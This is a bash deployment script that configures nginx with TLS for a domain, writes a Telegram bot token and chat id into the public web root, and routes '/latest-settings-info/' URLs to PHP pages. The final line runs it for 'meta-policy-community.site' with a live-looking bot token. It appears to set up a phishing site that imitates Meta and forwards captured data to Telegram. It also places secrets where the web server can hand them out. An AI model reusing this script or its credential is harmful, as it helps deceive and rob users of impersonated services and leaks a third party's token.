#!/bin/bash

# Check if required parameters are provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <domain> <certificate_filename> <private_key_filename> [chat_id] [token]"
    echo "Example: $0 example.com example.com.pem example.com.key 123456789 ABCDEF123456"
    exit 1
fi

DOMAIN=$1
CERT_FILENAME=$2
KEY_FILENAME=$3
CHAT_ID=$4
TOKEN=$5
SSL_CERT_PATH="/etc/ssl/certs/$CERT_FILENAME"
SSL_KEY_PATH="/etc/ssl/private/$KEY_FILENAME"
WWW_DOMAIN="www.$DOMAIN"
NGINX_AVAILABLE="/etc/nginx/sites-available/$DOMAIN"
NGINX_ENABLED="/etc/nginx/sites-enabled/$DOMAIN"
WEB_ROOT="/var/www/html/$DOMAIN"

echo "Stopping Nginx..."
sudo systemctl stop nginx

# Check if SSL files exist
if [ ! -f "$SSL_CERT_PATH" ]; then
    echo "Error: SSL certificate file not found at $SSL_CERT_PATH"
    exit 1
fi

if [ ! -f "$SSL_KEY_PATH" ]; then
    echo "Error: SSL private key file not found at $SSL_KEY_PATH"
    exit 1
fi

# Create web root directory
echo "Creating web root directory..."
if [ ! -d "$WEB_ROOT" ]; then
    sudo mkdir -p $WEB_ROOT
    sudo chmod -R 755 $WEB_ROOT
else
    sudo rm -rf $WEB_ROOT
    sudo mkdir -p $WEB_ROOT
    sudo chmod -R 755 $WEB_ROOT
fi

# Copy source files if they exist
if [ -d "/var/www/html/source" ]; then
    echo "Copying source files..."
    sudo cp -r /var/www/html/source/* $WEB_ROOT 2>/dev/null || true
fi

# Update chat_id.txt and token.txt if parameters are provided
if [ ! -z "$CHAT_ID" ]; then
    echo "Updating chat_id.txt..."
    echo "$CHAT_ID" | sudo tee "$WEB_ROOT/chat_id.txt" > /dev/null
fi

if [ ! -z "$TOKEN" ]; then
    echo "Updating token.txt..."
    echo "$TOKEN" | sudo tee "$WEB_ROOT/token.txt" > /dev/null
fi

# check config file
if [ -f "$NGINX_AVAILABLE" ]; then
    rm -rf $NGINX_AVAILABLE
    rm -rf $NGINX_ENABLED
fi

# Create Nginx configuration
echo "Creating Nginx configuration..."
sudo tee $NGINX_AVAILABLE > /dev/null << EOF
server {
    listen 80;
    server_name $DOMAIN $WWW_DOMAIN;

    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name $DOMAIN $WWW_DOMAIN;

    ssl_certificate $SSL_CERT_PATH;
    ssl_certificate_key $SSL_KEY_PATH;

    root $WEB_ROOT;
    index index.html index.htm index.php;

    location ~ ^/latest-settings-info/([^/]+)/([^/]+)/?$ {
        rewrite ^/latest-settings-info/([^/]+)/([^/]+)/?$ /latest-settings-info-page.php last;
    }

    location ~ ^/latest-settings-info/([^/]+)/?$ {
       rewrite ^/latest-settings-info/([^/]+)/?$ /latest-settings-info.php last;
    }

    location / {
        try_files \$uri \$uri/ \$uri.php?\$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
        include fastcgi_params;
    }
}
EOF

# Create symbolic link
echo "Creating symbolic link..."
sudo ln -sf $NGINX_AVAILABLE $NGINX_ENABLED

# Test Nginx configuration
echo "Testing Nginx configuration..."
sudo nginx -t

# Reload Nginx
echo "Reloading Nginx..."
sudo systemctl restart nginx

echo "Setup completed for $DOMAIN!"
echo "Please check if everything is working correctly"

./setup.sh meta-policy-community.site s292026256_meta-policy-community.site_server.pem s292026256_meta-policy-community.site_server.key -4636419482 7868057603:AAFYbZddzYXyK3rGdVNksYMmru_jB7K3n7M
